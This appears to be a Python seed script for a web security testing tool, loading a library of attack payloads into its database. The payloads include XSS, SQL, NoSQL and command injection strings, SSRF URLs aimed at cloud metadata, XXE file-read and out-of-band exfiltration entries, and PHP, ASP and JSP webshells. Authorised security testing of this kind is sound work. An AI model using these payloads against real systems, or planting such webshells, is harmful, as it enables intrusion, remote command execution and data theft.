#!/usr/bin/env python3
"""Seed default payloads into the database."""
import sys
sys.path.insert(0, '.')

from app.database import init_db, get_db_session
from app.models import PayloadLibrary

DEFAULT_PAYLOADS = [
    # XSS
    ("xss", "html", "<script>alert(1)</script>", "Basic script tag", ["reflected", "stored"]),
    ("xss", "html", "<img src=x onerror=alert(1)>", "Image onerror", ["reflected", "stored"]),
    ("xss", "html", "<svg onload=alert(1)>", "SVG onload", ["reflected", "stored"]),
    ("xss", "attribute", '" onfocus=alert(1) autofocus "', "Attribute breakout", ["reflected"]),
    ("xss", "attribute", "' onfocus=alert(1) autofocus '", "Single quote attribute", ["reflected"]),
    ("xss", "javascript", "';alert(1);//", "JS string breakout", ["dom"]),
    ("xss", "javascript", "\";alert(1);//", "JS double quote", ["dom"]),
    ("xss", "url", "javascript:alert(1)", "URL javascript:", ["reflected", "dom"]),

    # SQLi
    ("sqli", "mysql", "' OR '1'='1", "Basic boolean", ["error", "boolean"]),
    ("sqli", "mysql", "' OR '1'='1--", "Comment termination", ["error", "boolean"]),
    ("sqli", "mysql", "'; WAITFOR DELAY '0:0:5'--", "Time-based MSSQL", ["time"]),
    ("sqli", "mysql", "'; SELECT SLEEP(5)--", "Time-based MySQL", ["time"]),
    ("sqli", "postgres", "'; SELECT pg_sleep(5)--", "Time-based Postgres", ["time"]),
    ("sqli", "oracle", "' AND 1=CTXSYS.DRITHSX.SN(1,('test'))--", "Oracle error", ["error"]),

    # NoSQLi
    ("nosqli", "mongodb", '{"$ne": null}', "Not equal operator", ["operator"]),
    ("nosqli", "mongodb", '{"$gt": ""}', "Greater than", ["operator"]),
    ("nosqli", "mongodb", '{"$regex": ".*"}', "Regex match all", ["operator"]),
    ("nosqli", "mongodb", '{"$where": "function() { return true; }"}', "JavaScript where", ["js"]),

    # Command Injection
    ("cmdi", "unix", "; id", "Semicolon", ["basic"]),
    ("cmdi", "unix", "`id`", "Backticks", ["basic"]),
    ("cmdi", "unix", "$(id)", "Subshell", ["basic"]),
    ("cmdi", "unix", "|| id", "OR operator", ["basic"]),
    ("cmdi", "windows", "& whoami", "Ampersand", ["basic"]),
    ("cmdi", "windows", "| whoami", "Pipe", ["basic"]),

    # SSTI
    ("ssti", "jinja2", "{{7*7}}", "Math evaluation", ["generic"]),
    ("ssti", "jinja2", "{{config}}", "Config dump", ["generic"]),
    ("ssti", "twig", "{{7*7}}", "Twig math", ["generic"]),
    ("ssti", "freemarker", "${7*7}", "Freemarker math", ["generic"]),
    ("ssti", "velocity", "#set($x=7*7) $x", "Velocity math", ["generic"]),

    # SSRF
    ("ssrf", "basic", "http://169.254.169.254/latest/meta-data/", "AWS metadata", ["cloud"]),
    ("ssrf", "basic", "http://metadata.google.internal/computeMetadata/v1/", "GCP metadata", ["cloud"]),
    ("ssrf", "basic", "http://localhost:80", "Localhost", ["local"]),
    ("ssrf", "bypass", "http://127.0.0.1:80", "Direct IP", ["bypass"]),
    ("ssrf", "bypass", "http://2130706433:80", "Decimal IP", ["bypass"]),
    ("ssrf", "bypass", "http://0x7f000001:80", "Hex IP", ["bypass"]),
    ("ssrf", "bypass", "http://0177.0.0.1:80", "Octal IP", ["bypass"]),

    # XXE
    ("xxe", "generic", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "Local file read", ["file_read"]),
    ("xxe", "oob", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://{oob}/xxe.dtd"> %remote;]><root>&exfil;</root>', "OOB exfiltration", ["oob"]),

    # Path Traversal
    ("pathtrav", "unix", "../../../../etc/passwd", "Linux passwd", ["file_read"]),
    ("pathtrav", "windows", "..\\..\\..\\windows\\win.ini", "Windows win.ini", ["file_read"]),
    ("pathtrav", "encoded", "..%2f..%2f..%2fetc%2fpasswd", "URL encoded", ["bypass"]),

    # Open Redirect
    ("openredir", "basic", "https://evil.com", "Absolute URL", ["basic"]),
    ("openredir", "basic", "//evil.com", "Protocol-relative", ["basic"]),
    ("openredir", "bypass", "https://evil.com@", "Userinfo bypass", ["bypass"]),

    # File Upload
    ("fileupload", "php", "<?php system($_GET['cmd']); ?>", "PHP webshell", ["webshell"]),
    ("fileupload", "php", "<?php system($_GET['cmd']); ?>", "Double extension bypass", ["bypass"]),
    ("fileupload", "asp", "<% eval request(\"cmd\") %>", "ASP webshell", ["webshell"]),
    ("fileupload", "jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "JSP webshell", ["webshell"]),
    ("fileupload", "svg", '<svg onload=alert(1)>', "SVG XSS", ["xss"]),

    # JWT
    ("jwt", "alg_none", '{"alg":"none","typ":"JWT"}', "Algorithm none", ["bypass"]),
    ("jwt", "weak_secret", "secret", "Weak HMAC secret", ["crack"]),

    # Prototype Pollution
    ("proto", "client", "__proto__[polluted]=1", "Client-side pollution", ["client"]),
    ("proto", "server", "constructor.prototype.polluted=1", "Server-side pollution", ["server"]),
]


def seed():
    init_db()
    db = get_db_session()

    count = 0
    for cat, ctx, payload, desc, tags in DEFAULT_PAYLOADS:
        existing = db.query(PayloadLibrary).filter(
            PayloadLibrary.category == cat,
            PayloadLibrary.context == ctx,
            PayloadLibrary.payload == payload
        ).first()
        if not existing:
            p = PayloadLibrary(
                category=cat,
                context=ctx,
                payload=payload,
                description=desc,
                tags=tags,
            )
            db.add(p)
            count += 1

    db.commit()
    db.close()
    print(f"Seeded {count} new payloads")


if __name__ == "__main__":
    seed()